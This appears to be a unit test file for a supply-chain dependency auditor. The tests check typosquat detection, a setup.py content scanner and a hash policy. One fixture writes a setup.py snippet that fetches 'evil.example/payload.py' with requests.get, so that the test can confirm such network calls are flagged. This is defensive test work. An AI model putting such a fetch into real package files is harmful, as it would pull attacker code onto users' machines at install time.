import unittest

from auditor.dependency_policy import check_dependency_policy
from auditor.scanner import _scan_content
from auditor.typosquat import check_typosquat


class V5FalsePositiveReductionTests(unittest.TestCase):
    def test_pypi_hyphen_underscore_equivalent_is_not_typosquat(self):
        result = check_typosquat("charset_normalizer", "pip")
        self.assertFalse(result["is_suspicious"])

    def test_pypi_pydantic_core_equivalent_is_not_typosquat(self):
        result = check_typosquat("pydantic_core", "pip")
        self.assertFalse(result["is_suspicious"])

    def test_pypi_typing_extensions_equivalent_is_not_typosquat(self):
        result = check_typosquat("typing_extensions", "pip")
        self.assertFalse(result["is_suspicious"])

    def test_setup_py_plain_url_metadata_is_not_network_finding(self):
        content = '''
from setuptools import setup
setup(
    name="demo",
    url="https://github.com/example/demo",
    project_urls={"Docs": "https://docs.example.com"},
)
'''
        findings = _scan_content(content, "setup.py")
        self.assertEqual(findings, [])

    def test_setup_py_active_network_call_is_still_detected(self):
        content = '''
import requests
requests.get("https://evil.example/payload.py")
'''
        findings = _scan_content(content, "setup.py")
        self.assertTrue(any("network" in f["description"].lower() for f in findings))

    def test_environment_direct_packages_do_not_require_hash_policy(self):
        pkg = {
            "name": "requests",
            "ecosystem": "pip",
            "version": "2.32.5",
            "raw_spec": "2.32.5",
            "source_type": "environment-direct",
            "source_file": "pip inspect --local",
            "hashes": [],
        }
        result = check_dependency_policy(pkg, {})
        self.assertEqual(result["flags"], [])


if __name__ == "__main__":
    unittest.main()
